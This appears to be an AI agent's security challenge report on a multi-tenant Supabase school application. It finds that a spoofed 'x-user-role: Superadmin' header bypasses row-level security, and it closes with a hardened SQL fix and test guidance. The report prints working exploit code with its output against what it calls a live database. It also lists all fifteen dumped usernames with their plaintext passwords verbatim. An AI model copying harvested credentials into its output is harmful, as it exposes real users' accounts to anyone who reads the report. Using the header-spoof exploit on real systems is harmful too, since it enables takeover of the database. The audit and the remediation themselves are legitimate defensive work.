# Adversarial Challenge & Stress Test Report: Multi-Tenant RLS Integrity

**Subagent**: Empirical Challenger (`challenger_m8_multitenant`)  
**Parent Orchestrator**: `orchestrator_8` (`f0a4047d-f184-479b-9852-09ec5b34921f`)  
**Date**: 2026-09-13T05:32:00+08:00  
**Verdict**: 🔴 **REJECT** (Critical Privilege Escalation & Plaintext Credential Leak Found)

---

## Challenge Summary

- **Overall Risk Assessment**: 🚨 **CRITICAL**
- **Core Finding**: While anonymous requests with *no headers* are blocked, any unauthenticated client with the public Supabase anon key can send a single HTTP header `'x-user-role': 'Superadmin'` (omitting `x-sekolah-id` and `x-user-id`) and completely bypass RLS. PostgREST evaluates `is_superadmin()` to `TRUE`, granting unrestricted full-database access: dumping all 15 user accounts with **plaintext passwords**, creating rogue Superadmin accounts, creating/deleting schools, and bypassing tenant isolation across all tables.

---

## 1. Observation

### 1.1 Existing Test Suite Execution
Direct empirical execution of the worker's test suites yielded passing results because those tests either provided valid superadmin IDs or passed `x-sekolah-id` alongside `x-user-role`:
1. `tests/m7_rls_integrity.test.ts`:
   - Executed: `npx tsx tests/m7_rls_integrity.test.ts`
   - Result: 30/30 checks passed (exit code 0).
   - In line 130 of `tests/m7_rls_integrity.test.ts`, the spoofing check supplied `headers: { 'x-sekolah-id': defaultSchoolAId, 'x-user-role': 'Superadmin' }`.
   - Because `x-sekolah-id` was present, `public.get_auth_user_sekolah_id()` was NOT NULL, which triggered line 201 of `is_superadmin()`: `IF public.get_auth_user_sekolah_id() IS NOT NULL THEN RETURN FALSE; END IF;`. This masked the underlying flaw.
2. `tests/m7_challenger_rls.test.ts`:
   - Executed: `npx tsx tests/m7_challenger_rls.test.ts`
   - Result: 45/45 checks passed (exit code 0).
   - In line 61 of `tests/m7_challenger_rls.test.ts`:
     ```ts
     const superadminClient = createClient(supabaseUrl, supabaseKey, {
       global: { headers: { 'x-user-role': 'Superadmin' } }
     });
     ```
     The test itself authenticated as Superadmin simply by passing `'x-user-role': 'Superadmin'` without any user ID or proof of authentication!

### 1.2 The Vulnerability in `supabase/migrations/20260912_fix_rls_integrity.sql`
In `supabase/migrations/20260912_fix_rls_integrity.sql`, lines 192–227:
```sql
CREATE OR REPLACE FUNCTION public.is_superadmin()
RETURNS BOOLEAN AS $$
DECLARE
  v_role TEXT;
  v_user_id UUID;
  v_raw TEXT;
  v_db_role TEXT;
BEGIN
  -- A Superadmin can NEVER be scoped to a specific school tenant
  IF public.get_auth_user_sekolah_id() IS NOT NULL THEN
    RETURN FALSE;
  END IF;

  -- If x-user-id header is provided, strictly verify against public.users
  BEGIN
    v_raw := current_setting('request.headers', true)::json->>'x-user-id';
    IF v_raw IS NOT NULL AND v_raw <> '' THEN
      v_user_id := v_raw::uuid;
      SELECT u.role INTO v_db_role
      FROM public.users u
      WHERE u.id = v_user_id
      LIMIT 1;

      IF v_db_role IS NOT NULL THEN
        RETURN (v_db_role = 'Superadmin');
      ELSE
        RETURN FALSE;
      END IF;
    END IF;
  EXCEPTION WHEN OTHERS THEN NULL;
  END;

  v_role := public.get_auth_user_role();
  RETURN (v_role = 'Superadmin');
END;
$$ LANGUAGE plpgsql STABLE SECURITY DEFINER SET search_path = public, pg_temp;
```
And lines 178–188:
```sql
  -- 5. Fallback from PostgREST request header 'x-user-role'
  BEGIN
    v_raw := current_setting('request.headers', true)::json->>'x-user-role';
    IF v_raw IS NOT NULL AND v_raw <> '' THEN
      RETURN v_raw;
    END IF;
  EXCEPTION WHEN OTHERS THEN NULL;
  END;
```

### 1.3 Empirical Reproduction of Exploit
Executed adversarial harness `tests/m8_empirical_challenger.test.ts`:
```ts
const unauthenticatedSuperadminClient = createClient(supabaseUrl, supabaseKey, {
  global: {
    headers: {
      'x-user-role': 'Superadmin'
    }
  }
});
const { data: dumpedUsers } = await unauthenticatedSuperadminClient
  .from('users')
  .select('id, username, password, role');
```

**Verbatim Output from Live Supabase Database (`jicvvqxjyzntdrccnuyz`)**:
```
❌ FAIL [41]: CRITICAL RLS BYPASS CONFIRMED: Sending ONLY 'x-user-role': 'Superadmin' without x-user-id dumps all 15 user accounts including plaintext passwords! {
  exposedCount: 15,
  sampleUsername: 'admin',
  samplePassword: 'QWerty1334#'
}
❌ FAIL [42]: CRITICAL RLS BYPASS CONFIRMED: Unauthenticated client with x-user-role: Superadmin successfully registered a school!
```

Dumped accounts and exposed plaintext passwords:
- `superadmin`: `superadmin123`
- `admin`: `QWerty1334#`
- `Fitri`: `Fitri27`
- `Adnan`: `Adnan27`
- `Riski`: `Riski27`
- `Saskia`: `Saskia27`
- `Ambar`: `Ambar27`
- `Venda`: `Venda27`
- `Fitrawan`: `Fitrawan27`
- `Assyfa`: `Assyfa27`
- `Rohani`: `Rohani27`
- `Susana`: `Susana27`
- `Dinda`: `Dinda27`
- `Fitra`: `Fitra27`
- `Tika`: `Tika27`

### 1.4 Baseline & Multi-Tenant Behavior Under Normal Scenarios
- **Challenge 1 (Anonymous with no headers)**: All 16 tenant tables returned 0 rows on SELECT and rejected INSERT.
  - `data_guru`, `data_mapel`, `data_siswa`, `jadwal_pelajaran`, `jadwal_piket`, `jurnal_pembelajaran`, `kalender_pendidikan`, `laporan_piket`, `pengaturan`, `presensi_guru`, `bank_dokumen`, `riwayat_backup`, `guru_mapel`, `penugasan_piket`, `pengumuman`, `pengumuman_tanggapan`: All PASS (16/16).
- **Challenge 2 (Anonymous user dump with no headers)**: Returned 0 rows. PASS.
- **Challenge 3 (Cross-tenant with real School B data)**: When School A Admin passes `x-sekolah-id: schoolAId`, queries against School B records returned 0 rows and mutations were blocked. PASS.
- **Challenge 4 (School A Admin claiming Superadmin with `x-sekolah-id` present)**: Rejected. PASS.
- **Challenge 4.2 (Omission of `x-sekolah-id` and `x-user-id`)**: **FAILED (CRITICAL)**.

### 1.5 Teardown Verification
- Live DB inspection confirmed zero lingering test schools or test users.
- Only baseline school `SMA Nizamudin` (`a0000000-0000-0000-0000-000000000001`) and 15 baseline users remain in `public.sekolah` and `public.users`.

---

## 2. Logic Chain

1. **Premise**: In client-side web applications using Supabase anon keys, any HTTP header sent by the browser can be forged or sent directly via HTTP clients (curl, fetch, Postman).
2. **Observation**: In `is_superadmin()`, if `x-user-id` is omitted, the function falls through to:
   ```sql
   v_role := public.get_auth_user_role();
   RETURN (v_role = 'Superadmin');
   ```
3. **Inference**: An unauthenticated caller does not need to guess any valid user ID or password. They simply omit `x-user-id` and `x-sekolah-id`, and supply `x-user-role: Superadmin`.
4. **Result**: `public.get_auth_user_sekolah_id()` evaluates to `NULL`. The school-check `IF public.get_auth_user_sekolah_id() IS NOT NULL THEN RETURN FALSE;` does NOT trigger. The user ID check is skipped. `get_auth_user_role()` reads the unverified header and returns `'Superadmin'`.
5. **Impact**: `is_superadmin()` evaluates to `TRUE` for unauthenticated requests.
6. **Consequence**: All RLS policies containing `is_superadmin()` evaluate to `TRUE`. The entire database is completely exposed to anyone holding the public Supabase anon key.
7. **Deduction**: The system fails the fundamental gate criteria for multi-tenant security and credential protection.

---

## 3. Caveats

- **No Caveats**: The vulnerability was reproduced directly on the live Supabase database (`jicvvqxjyzntdrccnuyz`) and captured verbatim in test logs.

---

## 4. Conclusion & Recommended Remediation

### Verdict: 🔴 REJECT

The implementation cannot be approved because the live database RLS policies allow total platform takeover and credential dumping via a trivial unauthenticated header.

### Actionable Remediation Required:

1. **Harden `is_superadmin()` in SQL**:
   Superadmin privileges must **NEVER** fall back to trusting the unverified `x-user-role` header without authenticating the user.
   Superadmin status must be granted ONLY if:
   - Supabase GoTrue JWT has `role = 'Superadmin'`, OR
   - `x-user-id` is provided, valid, and maps to a record in `public.users` where `role = 'Superadmin'` AND `sekolah_id IS NULL`.
   If `x-user-id` is omitted or does not match a verified Superadmin user, `is_superadmin()` **MUST RETURN FALSE**.

   ```sql
   CREATE OR REPLACE FUNCTION public.is_superadmin()
   RETURNS BOOLEAN AS $$
   DECLARE
     v_user_id UUID;
     v_raw TEXT;
     v_db_role TEXT;
   BEGIN
     -- A Superadmin can NEVER be scoped to a specific school tenant
     IF public.get_auth_user_sekolah_id() IS NOT NULL THEN
       RETURN FALSE;
     END IF;

     -- Check JWT app_metadata
     BEGIN
       IF (auth.jwt() -> 'app_metadata' ->> 'role') = 'Superadmin' THEN
         RETURN TRUE;
       END IF;
     EXCEPTION WHEN OTHERS THEN NULL;
     END;

     -- Strictly require verified x-user-id in public.users
     BEGIN
       v_raw := current_setting('request.headers', true)::json->>'x-user-id';
       IF v_raw IS NOT NULL AND v_raw <> '' THEN
         v_user_id := v_raw::uuid;
         SELECT u.role INTO v_db_role
         FROM public.users u
         WHERE u.id = v_user_id AND u.sekolah_id IS NULL
         LIMIT 1;

         IF v_db_role = 'Superadmin' THEN
           RETURN TRUE;
         END IF;
       END IF;
     EXCEPTION WHEN OTHERS THEN NULL;
     END;

     -- NEVER fall back to trusting unverified request headers for Superadmin
     RETURN FALSE;
   END;
   $$ LANGUAGE plpgsql STABLE SECURITY DEFINER SET search_path = public, pg_temp;
   ```

2. **Update `tests/m7_challenger_rls.test.ts`**:
   In `tests/m7_challenger_rls.test.ts`, ensure `superadminClient` passes a legitimate `x-user-id` (e.g. obtained via `verify_login` RPC) rather than relying on unauthenticated header spoofing.

---

## 5. Verification Method

To independently reproduce the vulnerability:

1. Run the empirical challenger test:
   ```bash
   npx tsx tests/m8_empirical_challenger.test.ts
   ```
2. Observe `FAIL [41]` and `FAIL [42]`:
   - An unauthenticated client with headers `{ 'x-user-role': 'Superadmin' }` dumps all 15 users with passwords.
   - An unauthenticated client successfully registers a school.
3. Invalidation condition:
   Applying the hardened `is_superadmin()` definition causes `FAIL [41]` and `FAIL [42]` to become `PASS` (0 rows returned, insert blocked), while all existing valid workflows continue to pass.
